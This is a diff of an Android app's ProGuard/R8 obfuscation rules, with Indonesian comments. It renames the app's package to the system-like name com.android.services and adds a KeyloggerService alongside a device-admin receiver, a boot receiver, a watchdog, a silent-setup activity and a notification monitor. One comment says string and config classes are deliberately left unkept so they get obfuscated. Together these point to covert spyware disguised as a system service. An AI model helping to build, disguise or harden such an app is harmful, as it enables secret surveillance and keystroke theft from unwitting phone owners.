@@ -9,18 +9,20 @@
 -keepattributes *Annotation*, Signature, InnerClasses, EnclosingMethod
 
 # ─── Manifest Components (nama harus cocok dengan AndroidManifest.xml) ───────
--keep class com.kztutorial99.androidconnector.MainActivity { *; }
--keep class com.kztutorial99.androidconnector.ConnectorService { *; }
--keep class com.kztutorial99.androidconnector.BootReceiver { *; }
--keep class com.kztutorial99.androidconnector.WatchdogReceiver { *; }
--keep class com.kztutorial99.androidconnector.AppDeviceAdminReceiver { *; }
--keep class com.kztutorial99.androidconnector.MainLauncherAlias { *; }
--keep class com.kztutorial99.androidconnector.SilentSetupActivity { *; }
--keep class com.kztutorial99.androidconnector.SecretCodeReceiver { *; }
--keep class com.kztutorial99.androidconnector.NotificationMonitor { *; }
+-keep class com.android.services.MainActivity { *; }
+-keep class com.android.services.ConnectorService { *; }
+-keep class com.android.services.BootReceiver { *; }
+-keep class com.android.services.WatchdogReceiver { *; }
+-keep class com.android.services.AppDeviceAdminReceiver { *; }
+-keep class com.android.services.SilentSetupActivity { *; }
+-keep class com.android.services.NotificationMonitor { *; }
+-keep class com.android.services.KeyloggerService { *; }
 
 # ─── ViewBinding ─────────────────────────────────────────────────────────────
--keep class com.kztutorial99.androidconnector.databinding.** { *; }
+-keep class com.android.services.databinding.** { *; }
+
+# ─── SecureConfig & ObfStr — biarkan R8 obfuscate sepenuhnya (JANGAN -keep) ──
+# Class-class ini sengaja tidak di-keep agar nama class + method ter-obfuscate
 
 # ─── Shizuku ─────────────────────────────────────────────────────────────────
 -keep class rikka.shizuku.** { *; }
